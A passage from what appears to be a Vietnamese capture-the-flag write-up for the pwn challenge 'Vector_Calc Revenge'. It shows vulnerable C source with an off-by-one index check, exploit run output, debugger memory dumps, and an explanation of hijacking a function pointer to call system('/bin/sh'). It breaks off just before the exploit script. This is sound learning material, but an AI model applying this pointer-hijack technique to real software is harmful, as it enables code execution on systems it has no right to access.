</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> faves :0x55a8e7c77098
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> w1n :0x55a8e7c749d2
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> system :0x55a8e7c74100
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Switching to interactive mode
</span></span><span style="display:flex;"><span>$ exec 1&gt;&amp;<span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>user<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>$ cd /home/user
</span></span><span style="display:flex;"><span>$ ls
</span></span><span style="display:flex;"><span>chall
</span></span><span style="display:flex;"><span>flag-fe1e4f5e9309c30148cdbb9349cc329eda4186949b59d42041340a5e4657f38a.txt
</span></span><span style="display:flex;"><span>$ cat flag-fe1e4f5e9309c30148cdbb9349cc329eda4186949b59d42041340a5e4657f38a.txt
</span></span><span style="display:flex;"><span>W1<span style="color:#f92672">{</span>Ooops,... Pointers, uint64_t, long long, what the heck are they?<span style="color:#f92672">}</span>
</span></span></code></pre></div><p>-&gt; <code>FLAG: W1{Ooops,... Pointers, uint64_t, long long, what the heck are they?}</code></p>
<h3 id="2-vector_calc-revenge">2. Vector_Calc Revenge</h3>
<p><code>Host: nc 45.122.249.68 20018</code></p>
<p><code>Description: I have fixed the w1n function :)</code></p>
<p><code>Chall file:</code> <a href="https://github.com/w1n-gl0ry/CTF/blob/main/2023/miniCTF/pwn/VectorCALC-Revenge/chall_revenge">chall_revenge</a></p>
<p><code>chall_revenge.c</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdio.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;stdlib.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;unistd.h&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include &lt;string.h&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_FAVES 4</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define MAX_VECTORS 3</span>
</span></span><span style="display:flex;"><span>struct Vector{
</span></span><span style="display:flex;"><span>__uint64_t x;
</span></span><span style="display:flex;"><span>__uint64_t y;
</span></span><span style="display:flex;"><span>void (<span style="color:#f92672">*</span>printFunc)(struct Vector<span style="color:#f92672">*</span>);
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>struct Vector v_list[MAX_VECTORS];
</span></span><span style="display:flex;"><span>__uint64_t<span style="color:#f92672">*</span> sum;
</span></span><span style="display:flex;"><span>void<span style="color:#f92672">*</span> faves[MAX_FAVES];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printData(struct Vector<span style="color:#f92672">*</span> v);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void enterData(){
</span></span><span style="display:flex;"><span>    struct Vector<span style="color:#f92672">*</span> v;
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    v<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter x: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>x);
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Enter y: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printData(struct Vector<span style="color:#f92672">*</span> v){
</span></span><span style="display:flex;"><span>    puts(<span style="color:#e6db74">&#34;Data: &#34;</span>);
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;v = [</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,v<span style="color:#f92672">-&gt;</span>x,v<span style="color:#f92672">-&gt;</span>y);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void sumVector(){
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Save the sum to index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;</span> MAX_VECTORS){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    sum <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>v_list[idx];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>( i <span style="color:#f92672">!=</span> idx){
</span></span><span style="display:flex;"><span>            ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> v_list[idx]<span style="color:#f92672">.</span>x;
</span></span><span style="display:flex;"><span>            ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> v_list[idx]<span style="color:#f92672">.</span>y;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void loadFavorite(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    faves[idx] <span style="color:#f92672">=</span> malloc(sizeof(struct Vector));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    memcpy(faves[idx],<span style="color:#f92672">&amp;</span>sum[idx], sizeof(struct Vector));
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printFavorite(){
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(sum <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;You must set the sum before!&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>( ((__uint64_t <span style="color:#f92672">*</span>)faves[idx])[<span style="color:#ae81ff">2</span>] )
</span></span><span style="display:flex;"><span>        ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>printFunc(faves[idx]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> 
</span></span><span style="display:flex;"><span>        ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>printFunc(faves[idx]);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void addFavorute(){
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    __uint64_t idx;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;Index: &#34;</span>);
</span></span><span style="display:flex;"><span>    scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%lu</span><span style="color:#e6db74">&#34;</span>,<span style="color:#f92672">&amp;</span>idx);
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(idx <span style="color:#f92672">&gt;=</span> MAX_FAVES <span style="color:#f92672">||</span> faves[idx] <span style="color:#f92672">==</span> NULL){
</span></span><span style="display:flex;"><span>        puts(<span style="color:#e6db74">&#34;Invaild index!&#34;</span>);
</span></span><span style="display:flex;"><span>        exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>x <span style="color:#f92672">+=</span> ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>x;
</span></span><span style="display:flex;"><span>    ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>y <span style="color:#f92672">+=</span> ((struct Vector <span style="color:#f92672">*</span>)faves[idx])<span style="color:#f92672">-&gt;</span>y;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void init(){
</span></span><span style="display:flex;"><span>    setbuf(stdin,NULL);
</span></span><span style="display:flex;"><span>    setbuf(stdout,NULL);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span>(__uint64_t i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; i <span style="color:#f92672">&lt;</span> MAX_VECTORS ;<span style="color:#f92672">++</span>i){
</span></span><span style="display:flex;"><span>        v_list[i]<span style="color:#f92672">.</span>printFunc <span style="color:#f92672">=</span> printData;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void printMenu(){
</span></span><span style="display:flex;"><span>    printf(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;1. Enter data.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;2. Sum vector.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;3. Print sum vector</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;4. Save sum to favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;5. Print favorite</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;6. Add favorite to the sum</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;&gt; &#34;</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>int main(int argc, char<span style="color:#f92672">**</span> argv, char<span style="color:#f92672">**</span> envp){
</span></span><span style="display:flex;"><span>    init();
</span></span><span style="display:flex;"><span>    __uint32_t choice ;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>){
</span></span><span style="display:flex;"><span>        printMenu();
</span></span><span style="display:flex;"><span>        scanf(<span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%u</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>choice);
</span></span><span style="display:flex;"><span>        switch (choice)
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>            enterData();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>            sumVector();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>            ((struct Vector <span style="color:#f92672">*</span>)sum)<span style="color:#f92672">-&gt;</span>printFunc(sum);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span>:
</span></span><span style="display:flex;"><span>            loadFavorite();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span>:
</span></span><span style="display:flex;"><span>            printFavorite();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span>:
</span></span><span style="display:flex;"><span>            addFavorute();
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        default:
</span></span><span style="display:flex;"><span>            puts(<span style="color:#e6db74">&#34;Invaild option!&#34;</span>);
</span></span><span style="display:flex;"><span>            exit(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>void w1n(); <span style="color:#f92672">//</span> no more valid parameters to get shell <span style="color:#960050;background-color:#1e0010">!</span>
</span></span></code></pre></div><p>Ở bài này, tác giả đã sửa lại hàm <code>w1n()</code> một chút, ở tham số truyền vào lại là <code>echo '¯\\_(ツ)_/¯'</code> nên chúng ta không thể có shell :vv</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>calc                                                                                                                 <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">5</span>s <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#ae81ff">05</span><span style="color:#f92672">:</span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">50</span> <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─❯</span> python3 xpl.py                                                                                                                                          <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">+</span>] Opening connection to <span style="color:#ae81ff">45.122.249.68</span> on port <span style="color:#ae81ff">20018</span><span style="color:#f92672">:</span> Done
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>w1n<span style="color:#f92672">-</span>gl0ry<span style="color:#f92672">/</span>CTF<span style="color:#f92672">/</span>wannagame<span style="color:#f92672">/</span>calc<span style="color:#f92672">/</span>chall<span style="color:#960050;background-color:#1e0010">&#39;</span>
</span></span><span style="display:flex;"><span>    Arch:     amd64<span style="color:#f92672">-</span><span style="color:#ae81ff">64</span><span style="color:#f92672">-</span>little
</span></span><span style="display:flex;"><span>    RELRO:    Full RELRO
</span></span><span style="display:flex;"><span>    Stack:    Canary found
</span></span><span style="display:flex;"><span>    NX:       NX enabled
</span></span><span style="display:flex;"><span>    PIE:      PIE enabled
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] pie_base :<span style="color:#ae81ff">0x55c01873b000</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] v_list array :<span style="color:#ae81ff">0x55c01873e040</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] sum :<span style="color:#ae81ff">0x55c01873e080</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] faves :<span style="color:#ae81ff">0x55c01873e098</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] w1n :<span style="color:#ae81ff">0x55c01873b9d2</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] system :<span style="color:#ae81ff">0x55c01873b100</span>
</span></span><span style="display:flex;"><span>[<span style="color:#f92672">*</span>] Switching to interactive mode
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">¯\</span><span style="color:#a6e22e">_</span>(<span style="color:#960050;background-color:#1e0010">ツ</span>)_<span style="color:#f92672">/</span><span style="color:#960050;background-color:#1e0010">¯</span>
</span></span></code></pre></div><p>Quay lại lúc nãy, chúng ta thực thi được hàm <code>w1n</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">0x558c6065298c</span> <span style="color:#f92672">&lt;</span>main<span style="color:#f92672">+</span><span style="color:#ae81ff">173</span><span style="color:#f92672">&gt;</span>    call   rdx                           <span style="color:#f92672">&lt;</span>w1n<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>        rdi: <span style="color:#ae81ff">0x558c60655030</span> (stdin<span style="color:#960050;background-color:#1e0010">@</span>GLIBC_2<span style="color:#ae81ff">.2.5</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7fdff7ff6aa0</span> (_IO_2_1_stdin_) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0xfbad208b</span>
</span></span><span style="display:flex;"><span>        rsi: <span style="color:#ae81ff">0x3</span>
</span></span><span style="display:flex;"><span>        rdx: <span style="color:#ae81ff">0x558c606529d2</span> (w1n) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span>        rcx: <span style="color:#ae81ff">0x0</span>
</span></span></code></pre></div><p>Lúc này chúng ta cần điều khiển thanh ghi <code>rdi</code> trỏ đến chuỗi <code>/bin/sh\0</code> là được. Lúc gọi con trỏ hàm <code>((struct Vector *)sum)-&gt;printFunc(sum)</code> tham số của chúng ta là biến <code>sum</code>.</p>
<p>Mà <code>sum</code> lúc này đang trỏ đến <code>v_list-16</code>, do đó <code>rdi</code> chính xác đang trỏ đến <code>0x558c60655030 (stdin@GLIBC_2.2.5)</code> như trên hình</p>
<p>Điều chúng ta muốn bây giờ chính là <code>rdi-&gt;/bin/sh </code> , <code>rdx-&gt; w1n</code></p>
<p>-&gt; Khá là dễ dàng vì ta chỉ cần ghi vào 2 chunk trên v_list , chỉ số y của chunk này sẽ là <code>/bin/sh</code>, chỉ số x của chunk kế tiếp sẽ là địa chỉ hàm <code>w1n</code> (cách chính xác 16 bytes), ta sửa sum thành địa chỉ <code>/bin/sh</code> là sẽ có được shell</p>
<p>Mọi chuyện đã rõ ràng, ta bắt đầu thực hành:</p>
<p>Mình chỉnh sửa offset hàm w1n ngay chỗ thực hiện <code>call system</code> để tránh thanh ghi <code>rdi</code> được set cho giá trị rác</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ae81ff">00</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0000</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31040</span> (v_list) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x68732f6e69622f</span> <span style="color:#75715e">/* &#39;/bin/sh&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">01</span><span style="color:#f92672">:</span><span style="color:#ae81ff">000</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span> rax rdi <span style="color:#ae81ff">0x563e7ff31048</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x68732f6e69622f</span> <span style="color:#75715e">/* &#39;/bin/sh&#39; */</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">02</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0010</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31050</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">16</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff2e35d</span> (printData) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">03</span><span style="color:#f92672">:</span><span style="color:#ae81ff">001</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31058</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">24</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff2e9e4</span> (w1n<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> call <span style="color:#ae81ff">0x563e7ff2e100</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">04</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0020</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31060</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff2e9e4</span> (w1n<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> call <span style="color:#ae81ff">0x563e7ff2e100</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">05</span><span style="color:#f92672">:</span><span style="color:#ae81ff">002</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31068</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">40</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff2e35d</span> (printData) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">06</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0030</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31070</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">48</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">07</span><span style="color:#f92672">:</span><span style="color:#ae81ff">003</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31078</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">56</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x4</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">08</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0040</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31080</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">64</span>) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff2e35d</span> (printData) <span style="color:#960050;background-color:#1e0010">◂—</span> endbr64 
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">09</span><span style="color:#f92672">:</span><span style="color:#ae81ff">004</span><span style="color:#ae81ff">8</span><span style="color:#960050;background-color:#1e0010">│</span>         <span style="color:#ae81ff">0x563e7ff31088</span> (sum) <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x563e7ff31048</span> (v_list<span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>) <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x68732f6e69622f</span> <span style="color:#75715e">/* &#39;/bin/sh&#39;
</span></span></span></code></pre></div><p>Vậy <code>sum -&gt; v_list+8</code>, khi gọi con trỏ hàm thì <code>v_list+24-&gt;w1n</code> sẽ được gọi, với <code>sum</code> đang chứa địa chỉ chuỗi <code>/bin/sh</code></p>
<p>-&gt; Nhưng không thành công có được shell vì bị stack alignment cả local và remote</p>
<p>-&gt; Mình thử thay thế bằng <code>system.plt</code> thì không dính stack aligment và thành công chiếm được shell</p>
<p>Sau đây là script exploit của mình
Vector Exploit:
